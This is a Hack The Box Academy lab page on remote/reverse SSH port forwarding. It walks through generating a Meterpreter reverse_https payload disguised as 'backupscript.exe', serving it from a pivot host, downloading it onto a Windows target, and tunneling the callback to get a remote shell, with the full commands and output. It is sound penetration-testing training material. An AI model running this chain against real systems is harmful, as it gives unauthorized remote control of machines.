<!--
 // Platform: Academy
// URL: https://academy.hackthebox.com/module/158/section/1427
// Platform Version: V1
// Module ID: 158
// Module Name: Pivoting, Tunneling, and Port Forwarding
// Module Difficulty: Medium
// Section ID: 1427
// Section Title: Remote/Reverse Port Forwarding with SSH
// Page Title: Pivoting, Tunneling, and Port Forwarding
// Page Number: 04
-->

# Remote/Reverse Port Forwarding with SSH

**Module Name:** Pivoting, Tunneling, and Port Forwarding **Page Number:** 04

#### PIVOTING, TUNNELING, AND PORT FORWARDING

# Remote/Reverse Port Forwarding with SSH

![https://academy.hackthebox.com/storage/modules/158/33.png](https://academy.hackthebox.com/storage/modules/158/33.png)

#### Creating a Windows Payload with msfvenom

``` shell-session
[!bash!]$ msfvenom -p windows/x64/meterpreter/reverse_https lhost= <InternalIPofPivotHost> -f exe -o backupscript.exe LPORT=8080

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 712 bytes
Final size of exe file: 7168 bytes
Saved as: backupscript.exe
```

#### Configuring & Starting the multi/handler

``` shell-session
msf6 > use exploit/multi/handler

[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_https
payload => windows/x64/meterpreter/reverse_https
msf6 exploit(multi/handler) > set lhost 0.0.0.0
lhost => 0.0.0.0
msf6 exploit(multi/handler) > set lport 8000
lport => 8000
msf6 exploit(multi/handler) > run

[*] Started HTTPS reverse handler on https://0.0.0.0:8000
```

#### Transferring Payload to Pivot Host

``` shell-session
[!bash!]$ scp backupscript.exe ubuntu@<ipAddressofTarget>:~/

backupscript.exe                                   100% 7168    65.4KB/s   00:00
```

#### Starting Python3 Webserver on Pivot Host

``` shell-session
ubuntu@Webserver$ python3 -m http.server 8123
```

#### Downloading Payload from Windows Target

``` powershell-session
PS C:\Windows\system32> Invoke-WebRequest -Uri "http://172.16.5.129:8123/backupscript.exe" -OutFile "C:\backupscript.exe"
```

#### Using SSH -R

``` shell-session
[!bash!]$ ssh -R <InternalIPofPivotHost>:8080:0.0.0.0:8000 ubuntu@<ipAddressofTarget> -vN
```

#### Viewing the Logs from the Pivot

``` shell-session
ebug1: client_request_forwarded_tcpip: listen 172.16.5.129 port 8080, originator 172.16.5.19 port 61355
debug1: connect_next: host 0.0.0.0 ([0.0.0.0]:8000) in progress, fd=5
debug1: channel 1: new [172.16.5.19]
debug1: confirm forwarded-tcpip
debug1: channel 0: free: 172.16.5.19, nchannels 2
debug1: channel 1: connected to 0.0.0.0 port 8000
debug1: channel 1: free: 172.16.5.19, nchannels 1
debug1: client_input_channel_open: ctype forwarded-tcpip rchan 2 win 2097152 max 32768
debug1: client_request_forwarded_tcpip: listen 172.16.5.129 port 8080, originator 172.16.5.19 port 61356
debug1: connect_next: host 0.0.0.0 ([0.0.0.0]:8000) in progress, fd=4
debug1: channel 0: new [172.16.5.19]
debug1: confirm forwarded-tcpip
debug1: channel 0: connected to 0.0.0.0 port 8000
```

#### Meterpreter Session Established

``` shell-session
[*] Started HTTPS reverse handler on https://0.0.0.0:8000
[!] https://0.0.0.0:8000 handling request from 127.0.0.1; (UUID: x2hakcz9) Without a database connected that payload UUID tracking will not work!
[*] https://0.0.0.0:8000 handling request from 127.0.0.1; (UUID: x2hakcz9) Staging x64 payload (201308 bytes) ...
[!] https://0.0.0.0:8000 handling request from 127.0.0.1; (UUID: x2hakcz9) Without a database connected that payload UUID tracking will not work!
[*] Meterpreter session 1 opened (127.0.0.1:8000 -> 127.0.0.1 ) at 2022-03-02 10:48:10 -0500

meterpreter > shell
Process 3236 created.
Channel 1 created.
Microsoft Windows [Version 10.0.17763.1637]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\>
```

![https://academy.hackthebox.com/storage/modules/158/44.png](https://academy.hackthebox.com/storage/modules/158/44.png)

# 

# 

#### Questions

####